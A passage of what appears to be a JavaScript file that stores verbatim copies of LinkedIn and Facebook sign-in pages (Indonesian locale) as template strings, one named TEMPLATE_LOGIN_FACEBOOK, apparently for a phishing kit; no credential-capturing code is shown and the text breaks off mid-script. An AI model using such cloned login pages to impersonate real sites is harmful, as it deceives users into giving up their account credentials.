            <path d="M1 11H63V54H1V11Z" fill="#95ABC1"></path>
            <path d="M1 54L23.1 33.2C24.3 32.1 25.8 31.5 27.5 31.5H36.6C38.2 31.5 39.8 32.1 41 33.2L63 54H1Z" fill="#B4C6D8"></path>
            <path d="M63 11L36.5 36.8C34 39.2 29.9 39.2 27.4 36.8L1 11H63Z" fill="#D1DDE9"></path>
        </svg>

  
        </div>
        <p class="medium_text footer__content">Jika Anda tidak menemukan email tersebut di kotak pesan, periksa folder spam.</p>
        <button class="resend-button margin-top-12" id="btn-resend-otp" aria-label="Kirim ulang email" type="button">
          Kirim ulang email
        </button>
        <button class="otp-back-button" id="otp-cancel-button" aria-label="Kembali">
          Kembali
        </button>
      </div>
<!---->  
          </div>
        </div>
        <div class="join-now">
          
    
    

    Baru mengenal LinkedIn? <a href="/signup/cold-join" class="btn__tertiary--medium" id="join_now" data-litms-control-urn="login_join_now" data-cie-control-urn="join-now-btn">Bergabung sekarang</a>
  
        </div>
        <div id="checkpointGoogleOneTapContainerId" class="googleOneTapContainer global-alert-offset">
          
    
    

        <div class="google-one-tap-module hidden__imp">
          <div class="google-one-tap-module__outline">
            <p class="google-one-tap-module__header text-md font-bold text-color-text">
              Setuju & Bergabung dengan LinkedIn
            </p>
            <p class="google-one-tap-module__text">
              Dengan mengeklik Lanjutkan, Anda menyetujui <a href="/legal/user-agreement" target="_blank" data-tracking-will-navigate="true">Perjanjian Pengguna</a>, <a href="/legal/privacy-policy" target="_blank" data-tracking-will-navigate="true">Kebijakan Privasi</a>, dan <a href="/legal/cookie-policy" target="_blank" data-tracking-will-navigate="true">Kebijakan Cookie</a> LinkedIn.
            </p>
          </div>
          <div id="google-one-tap__container"></div>
        </div>
  
        </div>
        
      
      
            
      </main>

      
              
          
    
    
    
    
    
    
    
    

    
    
    
    
    
    
    
    
    

<!---->    <footer class="footer__base" role="contentinfo">
        <div class="footer__base__wrapper">
          <p class="copyright">
              

            <li-icon size="14dp" alt="LinkedIn" aria-hidden="true" type="linkedin-logo"><svg preserveaspectratio="xMinYMin meet" focusable="false">
                    <g class="scaling-icon" style="fill-opacity: 1">
                        <defs>
                        </defs>
                        <g class="logo-14dp">
                            <g class="dpi-1">
                                <g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <path d="M14,1.25 L14,12.75 C14,13.44 13.44,14 12.75,14 L1.25,14 C0.56,14 0,13.44 0,12.75 L0,1.25 C0,0.56 0.56,0 1.25,0 L12.75,0 C13.44,0 14,0.56 14,1.25" class="bug-text-color" fill="#FFFFFF" transform="translate(42.000000, 0.000000)">
                                    </path>
                                    <path d="M56,1.25 L56,12.75 C56,13.44 55.44,14 54.75,14 L43.25,14 C42.56,14 42,13.44 42,12.75 L42,1.25 C42,0.56 42.56,0 43.25,0 L54.75,0 C55.44,0 56,0.56 56,1.25 Z M47,5 L48.85,5 L48.85,6.016 L48.893,6.016 C49.259,5.541 50.018,4.938 51.25,4.938 C53.125,4.938 54,5.808 54,8 L54,12 L52,12 L52,8.75 C52,7.313 51.672,6.875 50.632,6.875 C49.5,6.875 49,7.75 49,9 L49,12 L47,12 L47,5 Z M44,12 L46,12 L46,5 L44,5 L44,12 Z M46.335,3 C46.335,3.737 45.737,4.335 45,4.335 C44.263,4.335 43.665,3.737 43.665,3 C43.665,2.263 44.263,1.665 45,1.665 C45.737,1.665 46.335,2.263 46.335,3 Z" class="background" fill="#0073B0"></path>
                                </g>
                                <g class="linkedin-text">
                                    <path d="M40,12 L38.107,12 L38.107,11.1 L38.077,11.1 C37.847,11.518 37.125,12.062 36.167,12.062 C34.174,12.062 33,10.521 33,8.5 C33,6.479 34.291,4.938 36.2,4.938 C36.971,4.938 37.687,5.332 37.97,5.698 L38,5.698 L38,2 L40,2 L40,12 Z M36.475,6.75 C35.517,6.75 34.875,7.49 34.875,8.5 C34.875,9.51 35.529,10.25 36.475,10.25 C37.422,10.25 38.125,9.609 38.125,8.5 C38.125,7.406 37.433,6.75 36.475,6.75 L36.475,6.75 Z" fill="#000000"></path>
                                    <path d="M31.7628,10.8217 C31.0968,11.5887 29.9308,12.0627 28.4998,12.0627 C26.3388,12.0627 24.9998,10.6867 24.9998,8.4477 C24.9998,6.3937 26.4328,4.9377 28.6578,4.9377 C30.6758,4.9377 31.9998,6.3497 31.9998,8.6527 C31.9998,8.8457 31.9708,8.9997 31.9708,8.9997 L26.8228,8.9997 L26.8348,9.1487 C26.9538,9.8197 27.6008,10.5797 28.6358,10.5797 C29.6528,10.5797 30.2068,10.1567 30.4718,9.8587 L31.7628,10.8217 Z M30.2268,7.9047 C30.2268,7.0627 29.5848,6.4297 28.6508,6.4297 C27.6058,6.4297 26.9368,7.0597 26.8728,7.9047 L30.2268,7.9047 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="18 2 20 2 20 7.882 22.546 5 25 5 21.9 8.199 24.889 12 22.546 12 20 8.515 20 12 18 12">
                                    </polygon>
                                    <path d="M10,5 L11.85,5 L11.85,5.906 L11.893,5.906 C12.283,5.434 13.031,4.938 14.14,4.938 C16.266,4.938 17,6.094 17,8.285 L17,12 L15,12 L15,8.73 C15,7.943 14.821,6.75 13.659,6.75 C12.482,6.75 12,7.844 12,8.73 L12,12 L10,12 L10,5 Z" fill="#000000"></path>
                                    <path d="M7,12 L9,12 L9,5 L7,5 L7,12 Z M8,1.75 C8.659,1.75 9.25,2.341 9.25,3 C9.25,3.659 8.659,4.25 8,4.25 C7.34,4.25 6.75,3.659 6.75,3 C6.75,2.341 7.34,1.75 8,1.75 L8,1.75 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="0 2 2 2 2 10 6 10 6 12 0 12"></polygon>
                                </g>
                            </g>
                            <g class="dpi-gt1" transform="scale(0.2917)">
                                <g class="inbug" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <path d="M44.5235,0 L3.6185,0 C1.6625,0 0.0005,1.547 0.0005,3.454 L0.0005,44.545 C0.0005,46.452 1.6625,48 3.6185,48 L44.5235,48 C46.4825,48 48.0005,46.452 48.0005,44.545 L48.0005,3.454 C48.0005,1.547 46.4825,0 44.5235,0" class="bug-text-color" fill="#FFFFFF" transform="translate(143.000000, 0.000000)">
                                    </path>
                                    <path d="M187.5235,0 L146.6185,0 C144.6625,0 143.0005,1.547 143.0005,3.454 L143.0005,44.545 C143.0005,46.452 144.6625,48 146.6185,48 L187.5235,48 C189.4825,48 191.0005,46.452 191.0005,44.545 L191.0005,3.454 C191.0005,1.547 189.4825,0 187.5235,0 Z M162,18 L168.5,18 L168.5,21.266 C169.437,19.388 171.838,17.7 175.445,17.7 C182.359,17.7 184,21.438 184,28.297 L184,41 L177,41 L177,29.859 C177,25.953 176.063,23.75 173.68,23.75 C170.375,23.75 169,26.125 169,29.859 L169,41 L162,41 L162,18 Z M150,41 L157,41 L157,18 L150,18 L150,41 Z M158,10.5 C158,12.985 155.985,15 153.5,15 C151.015,15 149,12.985 149,10.5 C149,8.015 151.015,6 153.5,6 C155.985,6 158,8.015 158,10.5 Z" class="background" fill="#0073B0"></path>
                                </g>
                                <g class="linkedin-text">
                                    <path d="M136,41 L130,41 L130,37.5 C128.908,39.162 125.727,41.3 122.5,41.3 C115.668,41.3 111.2,36.975 111.2,30 C111.2,23.594 114.951,17.7 121.5,17.7 C124.441,17.7 127.388,18.272 129,20.5 L129,7 L136,7 L136,41 Z M123.25,23.9 C119.691,23.9 117.9,26.037 117.9,29.5 C117.9,32.964 119.691,35.2 123.25,35.2 C126.81,35.2 129.1,32.964 129.1,29.5 C129.1,26.037 126.81,23.9 123.25,23.9 L123.25,23.9 Z" fill="#000000"></path>
                                    <path d="M108,37.125 C105.722,40.02 101.156,41.3 96.75,41.3 C89.633,41.3 85.2,36.354 85.2,29 C85.2,21.645 90.5,17.7 97.75,17.7 C103.75,17.7 108.8,21.917 108.8,30 C108.8,31.25 108.6,32 108.6,32 L92,32 L92.111,32.67 C92.51,34.873 94.873,36 97.625,36 C99.949,36 101.689,34.988 102.875,33.375 L108,37.125 Z M101.75,27 C101.797,24.627 99.89,22.7 97.328,22.7 C94.195,22.7 92.189,24.77 92,27 L101.75,27 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="63 7 70 7 70 27 78 18 86.75 18 77 28.5 86.375 41 78 41 70 30 70 41 63 41">
                                    </polygon>
                                    <path d="M37,18 L43,18 L43,21.375 C43.947,19.572 47.037,17.7 50.5,17.7 C57.713,17.7 59,21.957 59,28.125 L59,41 L52,41 L52,29.625 C52,26.969 52.152,23.8 48.5,23.8 C44.8,23.8 44,26.636 44,29.625 L44,41 L37,41 L37,18 Z" fill="#000000"></path>
                                    <path d="M29.5,6.125 C31.813,6.125 33.875,8.189 33.875,10.5 C33.875,12.811 31.813,14.875 29.5,14.875 C27.19,14.875 25.125,12.811 25.125,10.5 C25.125,8.189 27.19,6.125 29.5,6.125 L29.5,6.125 Z M26,41 L33,41 L33,18 L26,18 L26,41 Z" fill="#000000"></path>
                                    <polygon fill="#000000" points="0 7 7 7 7 34 22 34 22 41 0 41"></polygon>
                                </g>
                            </g>
                        </g>
                    </g>
                </svg></li-icon>

  
            <em>
              <span class="a11y__label">
                LinkedIn
              </span>
              © 2025
            </em>
          </p>
          <div>
            <ul class="footer__base__nav-list" aria-label="Footer Legal Menu">
              <li>
                  <a href="/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement">
                    Perjanjian Pengguna
                  </a>
              </li>
              <li>
                <a href="/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy">
                  Kebijakan Privasi
                </a>
              </li>
<!---->              <li>
                <a href="/help/linkedin/answer/34593?lang=en&amp;trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines">
                  Panduan Komunitas
                </a>
              </li>
              <li>
                <a href="/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy">
                  Kebijakan Cookie
                </a>
              </li>
              <li>
                <a href="/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy">
                  Kebijakan Hak Cipta
                </a>
              </li>
              <li id="feedback-request">
                <a href="/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&amp;lang=en" target="_blank" rel="nofollow noreferrer noopener">
                  Kirim Feedback
                </a>
              </li>
              
              

    

      <li>
        <div class="language-selector">
          <button class="language-selector__button" aria-expanded="false">
            <span class="language-selector__label-text">Bahasa</span>
            <i class="language-selector__label-icon">
              

        <svg viewbox="0 0 16 16" width="16" height="16" preserveaspectratio="xMinYMin meet" xmlns="http://www.w3.org/2000/svg">
            <path d="M8 9l5.93-4L15 6.54l-6.15 4.2a1.5 1.5 0 01-1.69 0L1 6.54 2.07 5z" fill="currentColor"></path>
        </svg>
  
            </i>
          </button>
          <div class="language-selector__dropdown hidden__imp">
            <ul>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="العربية (Arabic) 1 of 36 " role="button" data-locale="ar_AE" type="button">
                      العربية (Arabic)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="বাংলা (Bangla) 2 of 36 " role="button" data-locale="bn_IN" type="button">
                      বাংলা (Bangla)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Čeština (Czech) 3 of 36 " role="button" data-locale="cs_CZ" type="button">
                      Čeština (Czech)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Dansk (Danish) 4 of 36 " role="button" data-locale="da_DK" type="button">
                      Dansk (Danish)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Deutsch (German) 5 of 36 " role="button" data-locale="de_DE" type="button">
                      Deutsch (German)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Ελληνικά (Greek) 6 of 36 " role="button" data-locale="el_GR" type="button">
                      Ελληνικά (Greek)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="English (English) 7 of 36 " role="button" data-locale="en_US" type="button">
                      English (English)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Español (Spanish) 8 of 36 " role="button" data-locale="es_ES" type="button">
                      Español (Spanish)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="فارسی (Persian) 9 of 36 " role="button" data-locale="fa_IR" type="button">
                      فارسی (Persian)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Suomi (Finnish) 10 of 36 " role="button" data-locale="fi_FI" type="button">
                      Suomi (Finnish)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Français (French) 11 of 36 " role="button" data-locale="fr_FR" type="button">
                      Français (French)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="हिंदी (Hindi) 12 of 36 " role="button" data-locale="hi_IN" type="button">
                      हिंदी (Hindi)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Magyar (Hungarian) 13 of 36 " role="button" data-locale="hu_HU" type="button">
                      Magyar (Hungarian)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link language-selector__link--selected" aria-label="Bahasa Indonesia (Indonesian) 14 of 36 selected" role="button" data-locale="in_ID" type="button">
                      <strong>Bahasa Indonesia (Indonesian)</strong>
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Italiano (Italian) 15 of 36 " role="button" data-locale="it_IT" type="button">
                      Italiano (Italian)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="עברית (Hebrew) 16 of 36 " role="button" data-locale="iw_IL" type="button">
                      עברית (Hebrew)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="日本語 (Japanese) 17 of 36 " role="button" data-locale="ja_JP" type="button">
                      日本語 (Japanese)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="한국어 (Korean) 18 of 36 " role="button" data-locale="ko_KR" type="button">
                      한국어 (Korean)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="मराठी (Marathi) 19 of 36 " role="button" data-locale="mr_IN" type="button">
                      मराठी (Marathi)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Bahasa Malaysia (Malay) 20 of 36 " role="button" data-locale="ms_MY" type="button">
                      Bahasa Malaysia (Malay)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Nederlands (Dutch) 21 of 36 " role="button" data-locale="nl_NL" type="button">
                      Nederlands (Dutch)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Norsk (Norwegian) 22 of 36 " role="button" data-locale="no_NO" type="button">
                      Norsk (Norwegian)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="ਪੰਜਾਬੀ (Punjabi) 23 of 36 " role="button" data-locale="pa_IN" type="button">
                      ਪੰਜਾਬੀ (Punjabi)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Polski (Polish) 24 of 36 " role="button" data-locale="pl_PL" type="button">
                      Polski (Polish)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Português (Portuguese) 25 of 36 " role="button" data-locale="pt_BR" type="button">
                      Português (Portuguese)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Română (Romanian) 26 of 36 " role="button" data-locale="ro_RO" type="button">
                      Română (Romanian)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Русский (Russian) 27 of 36 " role="button" data-locale="ru_RU" type="button">
                      Русский (Russian)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Svenska (Swedish) 28 of 36 " role="button" data-locale="sv_SE" type="button">
                      Svenska (Swedish)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="తెలుగు (Telugu) 29 of 36 " role="button" data-locale="te_IN" type="button">
                      తెలుగు (Telugu)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="ภาษาไทย (Thai) 30 of 36 " role="button" data-locale="th_TH" type="button">
                      ภาษาไทย (Thai)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Tagalog (Tagalog) 31 of 36 " role="button" data-locale="tl_PH" type="button">
                      Tagalog (Tagalog)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Türkçe (Turkish) 32 of 36 " role="button" data-locale="tr_TR" type="button">
                      Türkçe (Turkish)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Українська (Ukrainian) 33 of 36 " role="button" data-locale="uk_UA" type="button">
                      Українська (Ukrainian)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="Tiếng Việt (Vietnamese) 34 of 36 " role="button" data-locale="vi_VN" type="button">
                      Tiếng Việt (Vietnamese)
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="简体中文 (Chinese (Simplified)) 35 of 36 " role="button" data-locale="zh_CN" type="button">
                      简体中文 (Chinese (Simplified))
                  </button>
                </li>
                <li class="language-selector__item">
                  <button class="language-selector__link " aria-label="正體中文 (Chinese (Traditional)) 36 of 36 " role="button" data-locale="zh_TW" type="button">
                      正體中文 (Chinese (Traditional))
                  </button>
                </li>
            </ul>
          </div>
        </div>
      </li>
  
            
            </ul>
<!---->          </div>
        </div>
    </footer>
  
        
    <artdeco-toasts></artdeco-toasts>
    <span class="hidden__imp toast-success-icon">
      

            <li-icon size="small" aria-hidden="true" type="success-pebble-icon"><svg viewbox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveaspectratio="xMinYMin meet" class="artdeco-icon" focusable="false">
                    <g class="small-icon" style="fill-opacity: 1">
                        <circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle>
                        <path d="M9.95,5.033l1.2,0.859l-3.375,4.775C7.625,10.875,7.386,10.999,7.13,11c-0.002,0-0.003,0-0.005,0    c-0.254,0-0.493-0.12-0.644-0.325L4.556,8.15l1.187-0.875l1.372,1.766L9.95,5.033z" fill="currentColor"></path>
                    </g>
                </svg></li-icon>

  
    </span>
    <span class="hidden__imp toast-error-icon">
      

        <li-icon size="small" aria-hidden="true" type="error-pebble-icon"><svg viewbox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveaspectratio="xMinYMin meet" class="artdeco-icon" focusable="false">
                <g class="small-icon" style="fill-opacity: 1">
                    <circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle>
                    <path fill="currentColor" d="M10.916,6.216L9.132,8l1.784,1.784l-1.132,1.132L8,9.132l-1.784,1.784L5.084,9.784L6.918,8L5.084,6.216l1.132-1.132L8,6.868l1.784-1.784L10.916,6.216z">
                    </path>
                </g>
            </svg>
        </li-icon>

  
    </span>
    <span class="hidden__imp toast-notify-icon">
      

        <li-icon size="small" aria-hidden="true" type="yield-pebble-icon"><svg viewbox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveaspectratio="xMinYMin meet" class="artdeco-icon" focusable="false">
                <g class="small-icon" style="fill-opacity: 1">
                    <circle class="circle" r="6.1" stroke="currentColor" stroke-width="1.8" cx="8" cy="8" fill="none" transform="rotate(-90 8 8)"></circle>
                    <path d="M7,10h2v2H7V10z M7,9h2V4H7V9z"></path>
                </g>
            </svg></li-icon>

  
    </span>
    <span class="hidden__imp toast-gdpr-icon">
      

        <li-icon aria-hidden="true" size="small" type="shield-icon"><svg viewbox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveaspectratio="xMinYMin meet" class="artdeco-icon" focusable="false">
                <path d="M8,1A10.89,10.89,0,0,1,2.87,3,1,1,0,0,0,2,4V9.33a5.67,5.67,0,0,0,2.91,5L8,16l3.09-1.71a5.67,5.67,0,0,0,2.91-5V4a1,1,0,0,0-.87-1A10.89,10.89,0,0,1,8,1ZM4,4.7A12.92,12.92,0,0,0,8,3.26a12.61,12.61,0,0,0,3.15,1.25L4.45,11.2A3.66,3.66,0,0,1,4,9.46V4.7Zm6.11,8L8,13.84,5.89,12.66A3.65,3.65,0,0,1,5,11.92l7-7V9.46A3.67,3.67,0,0,1,10.11,12.66Z" class="small-icon" style="fill-opacity: 1"></path>
            </svg></li-icon>
  
    </span>
    <span class="hidden__imp toast-cancel-icon">
      

            <li-icon size="large" type="cancel-icon">
                <svg x="0" y="0" id="cancel-icon" preserveaspectratio="xMinYMin meet" viewbox="0 0 24 24" width="24px" height="24px" style="color: black;">
                    <svg class="small-icon" style="fill-opacity: 1;">
                        <path d="M12.99,4.248L9.237,8L13,11.763L11.763,13L8,9.237L4.237,13L3,11.763L6.763,8L3,4.237L4.237,3L8,6.763l3.752-3.752L12.99,4.248z"></path>
                    </svg>
                    <svg class="large-icon" style="fill: currentColor;">
                        <path d="M20,5.237l-6.763,6.768l6.743,6.747l-1.237,1.237L12,13.243L5.257,19.99l-1.237-1.237l6.743-6.747L4,5.237L5.237,4L12,10.768L18.763,4L20,5.237z"></path>
                    </svg>
                </svg>
            </li-icon>

  
    </span>
  <code id="lix_checkpoint_remove_artdeco_toasts" style="display: none"><!--false--></code>
  
      
            

        <div id="loader-wrapper" class="hidden__imp">
          

            <li-icon class="blue" size="medium" aria-hidden="true" type="loader">
                <div class="artdeco-spinner"><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span><span class="artdeco-spinner-bars"></span></div>
            </li-icon>

  
        </div>
    </div>

<!---->  
        <code id="isDesktop" style="display: none"><!--true--></code>
        <code id="lix_pemberly_tracking_fireApfcEvent" style="display: none"><!--"enabled"--></code>
        <code id="lix_pemberly_tracking_human_integration" style="display: none"><!--"enabled"--></code>
        <code id="lix_pemberly_tracking_dfp_integration" style="display: none"><!--"control"--></code>
        <code id="lix_sync_apfc_headers" style="display: none"><!--"control"--></code>
        <code id="lix_sync_apfc_couchbase" style="display: none"><!--"enabled"--></code>
        <code id="lix_pemberly_tracking_recaptcha_v3" style="display: none"><!--"control"--></code>
        <code id="lix_pemberly_tracking_apfc_network_interceptor" style="display: none"><!--"control"--></code>
        <script src="https://static.licdn.com/sc/h/dj0ev57o38hav3gip4fdd172h" defer></script>
        <script src="https://static.licdn.com/sc/h/3tcbd8fu71yh12nuw2hgnoxzf" defer></script>
        
        
          <script src="https://static.licdn.com/sc/h/ax9fa8qn7acaw8v5zs7uo0oba" defer></script>
          <script src="https://static.licdn.com/sc/h/2nrnip1h2vmblu8dissh3ni93" defer></script>
          
        
    

    <code id="googleOneTapLibScriptPath" style="display: none"><!--"https://static.licdn.com/sc/h/923rbykk7ysv54066ch2pp3qb"--></code>
    <code id="i18nErrorGoogleOneTapGeneralErrorMessage" style="display: none"><!--"Terjadi kesalahan. Coba gunakan nama pengguna dan kata sandi."--></code>
    <code id="googleUseAutoSelect" style="display: none"><!--true--></code>
  
      
    

    <code id="googleSignInLibScriptPath" style="display: none"><!--"https://static.licdn.com/sc/h/84fpq9merojrilm067r9x3jdk"--></code>
    <code id="i18nErrorGoogleSignInGeneralErrorMessage" style="display: none"><!--"Terjadi kesalahan. Coba gunakan nama pengguna dan kata sandi."--></code>
  
  
        <code id="apfcDfPK" style="display: none"><!--"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqyVTa3Pi5twlDxHc34nl3MlTHOweIenIid6hDqVlh5/wcHzIxvB9nZjObW3HWfwqejGM+n2ZGbo9x8R7ByS3/V4qRgAs1z4aB6F5+HcXsx8uVrQfwigK0+u7d3g1s7H8qUaguMPHxNnyj5EisTJBh2jf9ODp8TpWnhAQHCCSZcDM4JIoIlsVdGmv+dGlzZzmf1if26U4KJqFdrqS83r3nGWcEpXWiQB+mx/EX4brbrhOFCvfPovvsLEjMTm0UC68Bvki3UsB/vkkMPW9cxNiiJJdnDkOEEdQPuFmPug+sqhACl3IIHLVBFM7vO0ca14rcCNSbSDaaKOY6BQoW1A30wIDAQAB"--></code>
        <code id="apfcDfPKV" style="display: none"><!--"2"--></code>
        <script src="https://static.licdn.com/sc/h/ce1b60o9xz87bra38gauijdx4" defer></script>
        <code id="usePasskeyLogin" style="display: none"><!--"support"--></code>
<!---->          <code id="isGoogleAutologinFixEnabled" style="display: none"><!--true--></code>
<!---->        <script src="https://static.licdn.com/sc/h/zf50zdwg8datnmpgmdbkdc4r" defer></script>
<!---->      
      
      
      </body>
</html>`;
const TEMPLATE_LOGIN_FACEBOOK = `<!DOCTYPE html>
<html lang="id" id="facebook" class="no_js">
<head><meta charset="utf-8" /><meta name="referrer" content="default" id="meta_referrer" /><script nonce="eFKpMBmC">function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"useTrustedTypes":false,"isTrustedTypesReportOnly":false,"ajaxpipe_token":"AXhgyCR1yuMNe_RIRiw","stack_trace_limit":30,"timesliceBufferSize":5000,"show_invariant_decoder":false,"compat_iframe_token":"AUUqVkAAa5UHJjkp2Oc11vPZQ1k","isCQuick":false,"brsid":"7519799750659299459","promise_include_trace":false});</script><script nonce="eFKpMBmC">window.openDatabase&&(window.openDatabase=function(){throw new Error()});</script><script nonce="eFKpMBmC">_btldr={};</script><script nonce="eFKpMBmC">(function(){function a(a){return a.parentElement!==document.body&&a.parentElement!==document.head}function b(a){return a.nodeName==="SCRIPT"||a.nodeName==="LINK"&&((a=c(a))==null?void 0:a.asyncCss)}function c(a){return!(a.dataset instanceof window.DOMStringMap)?null:a.dataset}function d(d){var e;try{if(d.nodeType!==Node.ELEMENT_NODE)return}catch(a){return}if(a(d)||!b(d))return;var f=(e=c(d))==null?void 0:e.bootloaderHash;if(f!=null&&f!==""){var g=null,h=function(){window._btldr[f]=1,g==null?void 0:g()};g=function(){d.removeEventListener("load",h),d.removeEventListener("error",h)};d.addEventListener("load",h);d.addEventListener("error",h)}}Array.from(document.querySelectorAll('script,link[data-async-css="1"]')).forEach(function(a){return d(a)});var e=new MutationObserver(function(a,b){a.forEach(function(a){a.type==="childList"&&Array.from(a.addedNodes).forEach(function(a){d(a)})})});e.observe(document.getElementsByTagName("html")[0],{attributes:!1,childList:!0,subtree:!0})})();</script><style nonce="eFKpMBmC"></style><script nonce="eFKpMBmC">__DEV__=0;</script><noscript><meta http-equiv="refresh" content="0; URL=/login/device-based/regular/login/?login_attempt=1&amp;_fb_noscript=1" /></noscript><link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/?is_workplace_mobile_pwa_dogfooding=0" crossorigin="use-credentials" /><title id="pageTitle">Masuk Facebook</title><meta name="bingbot" content="noarchive" /><meta name="description" content="Login ke Facebook untuk mulai membagikan sesuatu dan berhubungan dengan teman, keluarga, dan orang-orang yang Anda kenal." /><meta property="og:site_name" content="Facebook" /><meta property="og:url" content="https://id-id.facebook.com/login/device-based/regular/login/?login_attempt=1" /><meta property="og:locale" content="id_ID" /><link rel="canonical" href="https://id-id.facebook.com/login/web/" /><link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico" /><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/ym/l/0,cross/1uhmZ6dI-xW.css" data-bootloader-hash="v7mIMQ6" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yF/l/0,cross/NpUYdUVmmn-.css" data-bootloader-hash="u4F94Jx" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/ys/l/0,cross/l0WOVaOlNw0.css" data-bootloader-hash="O0cNsdJ" crossorigin="anonymous" />
<script src="https://static.xx.fbcdn.net/rsrc.php/v4/yW/r/Eng5_tHEVBC.js" data-bootloader-hash="YXnl/7v" crossorigin="anonymous"></script>
<script nonce="eFKpMBmC">requireLazy(["HasteSupportData"],function(m){m.handle({"clpData":{"6476":{"r":1000,"s":1},"1838142":{"r":1,"s":1},"1814852":{"r":1},"1848815":{"r":10000,"s":1}},"gkxData":{"20935":{"result":false,"hash":null},"21043":{"result":false,"hash":null},"5163":{"result":false,"hash":null},"5415":{"result":false,"hash":null},"7742":{"result":false,"hash":null},"8068":{"result":false,"hash":null},"8869":{"result":false,"hash":null},"9063":{"result":false,"hash":null},"15745":{"result":false,"hash":null},"20936":{"result":false,"hash":null},"20948":{"result":true,"hash":null},"25572":{"result":false,"hash":null},"1221":{"result":false,"hash":null},"13382":{"result":false,"hash":null},"25571":{"result":false,"hash":null}},"justknobxData":{"2552":{"r":false},"3323":{"r":true},"2269":{"r":true}}})});requireLazy(["TimeSliceImpl","ServerJS"],function(TimeSlice,ServerJS){(new 